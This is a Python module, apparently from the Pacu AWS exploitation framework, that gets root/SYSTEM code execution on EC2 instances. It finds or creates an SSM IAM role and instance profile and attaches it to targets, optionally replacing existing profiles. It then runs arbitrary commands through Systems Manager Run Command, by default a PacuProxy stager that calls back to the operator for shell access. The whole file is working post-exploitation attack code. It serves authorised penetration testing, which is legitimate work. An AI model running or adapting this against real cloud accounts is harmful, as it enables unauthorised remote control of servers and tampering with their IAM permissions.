#!/usr/bin/env python3
import argparse
import os
import re
import time
from botocore.exceptions import ClientError


module_info = {
    # Name of the module (should be the same as the filename)
    'name': 'sysman_ec2_rce',

    # Name and any other notes about the author
    'author': 'Spencer Gietzen',

    # Category of the module. Make sure the name matches an existing category.
    'category': 'post_exploitation',

    # One liner description of the module functionality. This shows up when a user searches for modules.
    'one_liner': 'Tries to execute code as root/SYSTEM on EC2 instances.',

    # Full description about what the module does and how it works
    'description': 'This module tries to execute arbitrary code on EC2 instances as root/SYSTEM using EC2 Systems Manager. To do so, it will first try to enumerate EC2 instances that are running operating systems that have the Systems Manager agent installed by default. Then, it will attempt to find the Systems Manager IAM instance profile, or try to create it if it cannot find it. If successful, it will try to attach it to the instances enumerated earlier. Then it will use EC2 Run Command to execute arbitrary code on the EC2 instances as either root (Linux) or SYSTEM (Windows). If PacuProxy is listening and no command argument is passed in, then by default, this module will execute a PacuProxy stager on the target hosts to get a PacuProxy agent to route commands through/give you shell access. Note: Linux targets will run the command using their default shell (bash/etc.) and Windows hosts will run the command using PowerShell, so be weary of that when trying to run the same command against both operating systems.',

    # A list of AWS services that the module utilizes during its execution
    'services': ['EC2'],

    # For prerequisite modules, try and see if any existing modules return the data that is required for your module before writing that code yourself, that way, session data can stay separated and modular.
    'prerequisite_modules': ['enum_ec2'],

    # Module arguments to autocomplete when the user hits tab
    'arguments_to_autocomplete': ['--command', '--target-os', '--all-instances', '--replace', '--ip-name'],
}

parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])

parser.add_argument('--command', required=False, default=None, help='The shell command to run on the targeted EC2 instances. If no command is specified AND PacuProxy is listening, the default will be to run a PacuProxy stager against each target')
parser.add_argument('--target-os', required=False, default='All', help='This argument is what operating systems to target. Valid options are: Windows, Linux, or All. The default is All')
parser.add_argument('--all-instances', required=False, default=False, action='store_true', help='Skip vulnerable operating system check and just target every instance')
parser.add_argument('--target-instances', required=False, default=None, help='A comma-separated list of instances and regions to set as the attack targets in the format of instance-id@region,instance2-id@region...')
parser.add_argument('--replace', required=False, default=False, action='store_true', help='For EC2 instances that already have an instance profile attached to them, this argument will replace those with the Systems Manager instance profile. WARNING: This can cause bad things to happen! You never know what negative side effects this may have on a server without further inspection, because you do not know what permissions you are removing/replacing that the instance already had')
parser.add_argument('--ip-name', required=False, default=None, help='The name of an existing instance profile with an "EC2 Role for Simple Systems Manager" attached to it. This will skip the automatic role/instance profile enumeration and the searching for a Systems Manager role/instance profile')


def help():
    return [module_info, parser.format_help()]


def main(args, pacu_main):
    session = pacu_main.get_active_session()
    proxy_settings = pacu_main.get_proxy_settings()

    ###### Don't modify these. They can be removed if you are not using the function.
    args = parser.parse_args(args)
    print = pacu_main.print
    input = pacu_main.input
    fetch_data = pacu_main.fetch_data
    get_regions = pacu_main.get_regions
    ######

    # Make sure args.target_os equals one of All, Windows, or Linux
    if not (args.target_os.lower() == 'all' or args.target_os.lower() == 'windows' or args.target_os.lower() == 'linux'):
        print('Invalid option specified for the --target-os argument. Valid options include: All, Windows, or Linux. If --target-os is not specified, the default is All.\n')
        return

    # Make sure --all-instances and --target-instances are not passed in together
    if args.all_instances is True and args.target_instances is not None:
        print('Invalid arguments received. Expecting one or zero of --all-instances and --target-instances, received both.\n')
        return

    # If no command was passed in and PacuProxy is listening, set the command
    # to be executed to a PacuProxy stager
    if args.command is None and proxy_settings.listening is True:
        pp_ps_stager = pacu_main.get_proxy_stager(proxy_settings.ip, proxy_settings.port, 'ps')
        pp_sh_stager = pacu_main.get_proxy_stager(proxy_settings.ip, proxy_settings.port, 'sh')
    elif args.command is None and proxy_settings.listening is False:
        print('Invalid arguments received. No command argument was passed in and PacuProxy is not listening, so there is no default. Either start PacuProxy and run again or run again with the --command argument.\n')
        return

    if fetch_data(['EC2', 'Instances'], 'enum_ec2', '--instances') is False:
        print('Pre-req module not run successfully. Exiting...\n')
        return
    instances = session.EC2['Instances']

    regions = get_regions('EC2')

    targeted_instances = []
    ssm_role_name = ''
    ssm_instance_profile_arn = None
    if args.ip_name is not None:
        ssm_instance_profile_name = args.ip_name
    else:
        ssm_instance_profile_name = ''

    if args.all_instances is False and args.target_instances is None:
        # DryRun describe_images (don't need to DryRun this if args.all_instances is True)
        try:
            client = pacu_main.get_boto3_client('ec2', regions[0])
            client.describe_images(
                DryRun=True
            )
        except ClientError as error:
            if not str(error).find('UnauthorizedOperation') == -1:
                print('Dry run failed, the current AWS account does not have the necessary permissions to run "describe_images". Operating system enumeration is no longer trivial.\n')

        os_with_default_ssm_agent = [
            '[\s\S]*Windows[\s\S]*Server[\s\S]*2016[\s\S]*',
            '[\s\S]*Amazon[\s\S]*Linux[\s\S]*',
            '[\s\S]*Ubuntu[\s\S]*Server[\s\S]*18\\.04[\s\S]*LTS[\s\S]*',
            # 'Windows Server 2003-2012 R2 released after November 2016'
        ]

        # Begin enumeration of vulnerable images
        vuln_images = []
        for region in regions:
            image_ids = []
            print(f'Starting region {region}...')
            client = pacu_main.get_boto3_client('ec2', region)

            for instance in instances:
                if instance['Region'] == region:
                    image_ids.append(instance['ImageId'])

            # Describe all images being used in the environment
            if image_ids == []:
                print('  No images found.\n')
            else:
                images = client.describe_images(
                    ImageIds=list(set(image_ids))
                )['Images']

                # Iterate images and determine if they are possibly one of the
                # operating systems with SSM agent installed by default
                count = 0
                for image in images:
                    os_details = '{} {} {}'.format(
                        image['Description'],
                        image['ImageLocation'],
                        image['Name']
                    )
                    for vuln_os in os_with_default_ssm_agent:
                        result = re.match(r'{}'.format(vuln_os), os_details)
                        if result is not None:
                            count += 1
                            vuln_images.append(image['ImageId'])
                            break
                print(f'  {count} vulnerable images found.\n')
        print(f'Total vulnerable images found: {len(vuln_images)}\n')

    if ssm_instance_profile_name == '':
        # Begin Systems Manager role finder/creator
        client = pacu_main.get_boto3_client('iam')

        ssm_policy = client.get_policy(
            PolicyArn='arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM'
        )['Policy']

        if ssm_policy['AttachmentCount'] > 0:
            if fetch_data(['IAM', 'Roles'], 'enum_users_roles_policies_groups', '--roles') is False:
                print('Pre-req module not run successfully. Exiting...\n')
                return
            roles = session.IAM['Roles']

            # For each role that exists in the account
            for role in roles:
                # For each AssumeRole statement
                for statement in role['AssumeRolePolicyDocument']['Statement']:
                    # Statement->Principal could be a liist or a dict
                    if type(statement['Principal']) is list:
                        # For each item in the list, check if ec2.amazonaws.com is in it
                        for principal in statement['Principal']:
                            if 'ec2.amazonaws.com' in principal:
                                attached_policies = client.list_attached_role_policies(
                                    RoleName=role['RoleName'],
                                    PathPrefix='/service-role/'
                                )['AttachedPolicies']

                                # It is an EC2 role, now figure out if it is an SSM EC2
                                # role by checking for the SSM policy being attached
                                for policy in attached_policies:
                                    if policy['PolicyArn'] == 'arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM':
                                        ssm_role_name = role['RoleName']
                                        break
                                if not ssm_role_name == '':
                                    break
                        if not ssm_role_name == '':
                            break
                    elif type(statement['Principal']) is dict:
                        # For each key in the dict, check if it equal ec2.amazonaws.com
                        for key in statement['Principal']:
                            if statement['Principal'][key] == 'ec2.amazonaws.com':
                                attached_policies = client.list_attached_role_policies(
                                    RoleName=role['RoleName']
                                )['AttachedPolicies']

                                # It is an EC2 role, now figure out if it is an SSM EC2
                                # role by checking for the SSM policy being attached
                                for policy in attached_policies:
                                    if policy['PolicyArn'] == 'arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM':
                                        ssm_role_name = role['RoleName']
                                        break
                                if not ssm_role_name == '':
                                    break
                        if not ssm_role_name == '':
                            break
                if not ssm_role_name == '':
                    break
        if ssm_role_name == '':
            print('Did not find valid EC2 SystemsManager service role (which means there is no instance profile either). Trying to create one now...\n')
            try:
                # Create the SSM role
                create_response = client.create_role(
                    RoleName='SSM',
                    AssumeRolePolicyDocument='{"Version": "2012-10-17", "Statement": [{"Sid": "", "Effect": "Allow", "Principal": {"Service": "ec2.amazonaws.com"}, "Action": "sts:AssumeRole"}]}'
                )['Role']

                ssm_role_name = create_response['RoleName']

                # Attach the SSM policy to the role just created
                client.attach_role_policy(
                    RoleName=ssm_role_name,
                    PolicyArn='arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM'
                )
                print(f"  Successfully created the required role: {create_response['Arn']}\n")
            except Exception as error:
                print(f'  Unable to create the required role: {str(error)}\n')
                return
        else:
            print(f'Found valid SystemsManager service role: {ssm_role_name}. Checking if it is associated with an instance profile...\n')

            # Find instance profile belonging to that role
            response = client.list_instance_profiles_for_role(
                RoleName=ssm_role_name,
                MaxItems=1
            )

            if len(response['InstanceProfiles']) > 0:
                ssm_instance_profile_name = response['InstanceProfiles'][0]['InstanceProfileName']
                ssm_instance_profile_arn = response['InstanceProfiles'][0]['Arn']
                print(f'Found valid instance profile: {ssm_instance_profile_name}.\n')
            # Else, leave ssm_instance_profile_name == ''

        # If no instance profile yet, create one with the role we have
        if ssm_instance_profile_name == '':
            # There is no instance profile yet
            try:
                # Create a new instance profile
                response = client.create_instance_profile(
                    InstanceProfileName='SSM'
                )['InstanceProfile']

                ssm_instance_profile_name = response['InstanceProfileName']
                ssm_instance_profile_arn = response['Arn']

                # Attach our role to the new instance profile
                client.add_role_to_instance_profile(
                    InstanceProfileName=ssm_instance_profile_name,
                    RoleName=ssm_role_name
                )
            except Exception as error:
                print(f'  Unable to create an instance profile: {str(error)}\n')
                return

    # If there are target instances passed in as arguments, fix instances and regions
    if args.target_instances is not None:
        instances = []
        regions = []
        if ',' in args.target_instances:
            # Multiple instances passed in
            split = args.target_instances.split(',')
        else:
            # Only one instance passed in
            split = [args.target_instances]
        for instance in split:
            instance_at_region_split = instance.split('@')
            instances.append({
                'InstanceId': instance_at_region_split[0],
                'Region': instance_at_region_split[1]
            })
            regions.append(instance_at_region_split[1])
        # Kill duplicate regions
        regions = list(set(regions))

    # Start attaching the instance profile to the vulnerable instances
    print('Starting to attach the instance profile to target EC2 instances...\n')
    # args.replace is the static argument passed in from the user, but the
    # variable replace can be modified in cases where the call is failing,
    # likely due to permissions, but I give the user a choice below in the
    # error handling section
    replace = args.replace
    for region in regions:
        client = pacu_main.get_boto3_client('ec2', region)
        # instances_to_replace will be filled up as each instance is checked for
        # each region. The describe_iam_instance_profile_associations API call
        # supports multiple instance IDs as filters, so by collecting a list and
        # then running the API call once for all IDs, it minimizes the amount of
        # total API calls made.
        instances_to_replace = []
        for instance in instances:
            if instance['State']['Name'] == 'running' or instance['State']['Name'] == 'stopped':
                if instance['Region'] == region:
                    if args.target_instances is not None or args.all_instances is True or instance['ImageId'] in vuln_images:
                        if 'IamInstanceProfile' in instance:
                            # The instance already has an instance profile attached, skip it if
                            # args.replace is not True, otherwise add it to instances_to_replace
                            if args.replace is True and replace is True:
                                instances_to_replace.append(instance['InstanceId'])
                            else:
                                print(f"  Instance ID {instance['InstanceId']} already has an instance profile attached to it, skipping...")
                                pass
                        else:
                            # There is no instance profile attached yet, do it now
                            response = client.associate_iam_instance_profile(
                                InstanceId=instance['InstanceId'],
                                IamInstanceProfile={
                                    'Arn': ssm_instance_profile_arn,
                                    'Name': ssm_instance_profile_name
                                }
                            )
                            targeted_instances.append(instance['InstanceId'])
                            print(f"  Instance profile attached to instance ID {instance['InstanceId']}.")
        if len(instances_to_replace) > 0 and replace is True:
            # There are instances that need their role replaced, so discover association IDs to make that possible
            all_associations = []
            response = client.describe_iam_instance_profile_associations(
                Filters=[
                    {
                        'Name': 'instance-id',
                        'Values': instances_to_replace
                    }
                ]
            )
            all_associations.extend(response['IamInstanceProfileAssociations'])
            while 'NextToken' in response:
                response = client.describe_iam_instance_profile_associations(
                    NextToken=response['NextToken'],
                    Filters=[
                        {
                            'Name': 'instance-id',
                            'Values': instances_to_replace
                        }
                    ]
                )
                all_associations.extend(response['IamInstanceProfileAssociations'])

            # Start replacing the instance profiles
            for instance_id in instances_to_replace:
                for association in all_associations:
                    if instance_id == association['InstanceId']:
                        association_id = association['AssociationId']
                        break
                try:
                    client.replace_iam_instance_profile_association(
                        AssociationId=association_id,
                        IamInstanceProfile={
                            'Name': ssm_instance_profile_name
                        }
                    )
                    targeted_instances.append(instance_id)
                    print(f'  Instance profile replaced for instance ID {instance_id}.')
                except Exception as error:
                    print(f'  Failed to run replace_iam_instance_profile_association on instance ID {instance_id}: {str(error)}\n')
                    replace = input('Do you want to keep trying to replace instance profiles, or skip the rest based on the error shown? (y/n) ')
                    if replace == 'y':
                        replace = True
                    else:
                        replace = False
                        break

    print('\n  Done.\n')

    # Start polling SystemsManager/RunCommand to see if instances show up
    print('Waiting for targeted instances to appear in Systems Manager... This will be checked every 30 seconds for 10 minutes (or until all targeted instances have shown up, whichever is first). After each check, the shell command will be executed against all new instances that showed up since the last check. If an instance has not shown up after 10 minutes, it most likely means that it does not have the SSM Agent installed and is not vulnerable to this attack.\n')

    # Check 20 times in 30 second intervals (10 minutes) or until all targeted instances have been attacked
    discovered_instances = []
    attacked_instances = []
    ignored_instances = []
    for i in range(1, 21):
        this_check_attacked_instances = []
        for region in regions:
            # Accumulate a list of instances to attack to minimize the amount of API calls being made
            windows_instances_to_attack = []
            linux_instances_to_attack = []
            client = pacu_main.get_boto3_client('ssm', region)

            # Enumerate instances that appear available to Systems Manager
            response = client.describe_instance_information()
            for instance in response['InstanceInformationList']:
                discovered_instances.append([instance['InstanceId'], instance['PlatformType']])
            while 'NextToken' in response:
                response = client.describe_instance_information(
                    NextToken=response['NextToken']
                )
                for instance in response['InstanceInformationList']:
                    discovered_instances.append([instance['InstanceId'], instance['PlatformType']])

            for instance in discovered_instances:
                # Has this instance been attacked yet?
                if instance[0] not in attacked_instances and instance[0] not in ignored_instances:
                    if args.target_os.lower() == 'all' or instance[1].lower() == args.target_os.lower():
                        # Is this instance eligible for an attack, but was not targeted?
                        if instance[0] not in targeted_instances:
                            action = input(f'  Instance ID {instance[0]} (Platform: {instance[1]}) was not found in the list of targeted instances, but it might be possible to attack it, do you want to try and attack this instance (a) or ignore it (i)? (a/i) ')
                            if action == 'i':
                                ignored_instances.append(instance[0])
                                continue
                            else:
                                print(f'  Adding instance ID {instance[0]} to list of targets.\n')
                                targeted_instances.append(instance[0])
                        if instance[1].lower() == 'windows':
                            windows_instances_to_attack.append(instance[0])
                        elif instance[1].lower() == 'linux':
                            linux_instances_to_attack.append(instance[0])
                        else:
                            print(f'  Unknown operating system for instance ID {instance[0]}: {instance[1]}. Not attacking it...\n')

            # Collectively attack all new instances that showed up in the last check for this region

            # Windows
            if len(windows_instances_to_attack) > 0 and (args.target_os.lower() == 'all' or args.target_os.lower() == 'windows'):
                # If a shell command was passed in, run it. Otherwise, try to install python3 then run a PacuProxy stager
                if args.command is not None:
                    params = {
                        'commands': [args.command]
                    }
                else:
                    params = {
                        'commands': [pp_ps_stager]
                    }
                response = client.send_command(
                    InstanceIds=windows_instances_to_attack,
                    DocumentName='AWS-RunPowerShellScript',
                    MaxErrors='100%',
                    Parameters=params
                )
                this_check_attacked_instances.extend(windows_instances_to_attack)
                attacked_instances.extend(windows_instances_to_attack)

            # Linux
            if len(linux_instances_to_attack) > 0 and (args.target_os.lower() == 'all' or args.target_os.lower() == 'linux'):
                # If a shell command was passed in, run it. Otherwise, try to install python3 then run a PacuProxy stager
                if args.command is not None:
                    params = {
                        'commands': [args.command]
                    }
                else:
                    params = {
                        'commands': ['yum install python3 -y', 'apt-get install python3 -y', pp_sh_stager]
                    }
                response = client.send_command(
                    InstanceIds=linux_instances_to_attack,
                    DocumentName='AWS-RunShellScript',
                    MaxErrors='100%',
                    Parameters=params
                )
                this_check_attacked_instances.extend(linux_instances_to_attack)
                attacked_instances.extend(linux_instances_to_attack)

        print(f'  {len(this_check_attacked_instances)} new instances attacked in the latest check: {this_check_attacked_instances}\n')

        if attacked_instances == targeted_instances:
            # All targeted instances have been attacked, stop polling every 30 seconds
            break

        # Don't wait 30 seconds after the very last check
        if not i == 20:
            print('Waiting 30 seconds...\n')
            time.sleep(30)

    if i == 20:
        # We are here because it has been 10 minutes
        print('It has been 10 minutes, if any target instances were not successfully attacked, then that most likely means they are not vulnerable to this attack (most likely the SSM Agent is not installed on the instances).\n')
        print(f'Successfully attacked the following instances: {attacked_instances}\n')
    else:
        # We are here because all targeted instances have been attacked
        print('All targeted instances showed up and were attacked.\n')
        print(f'Successfully attacked the following instances: {attacked_instances}\n')

    print(f'{os.path.basename(__file__)} completed.')
    return
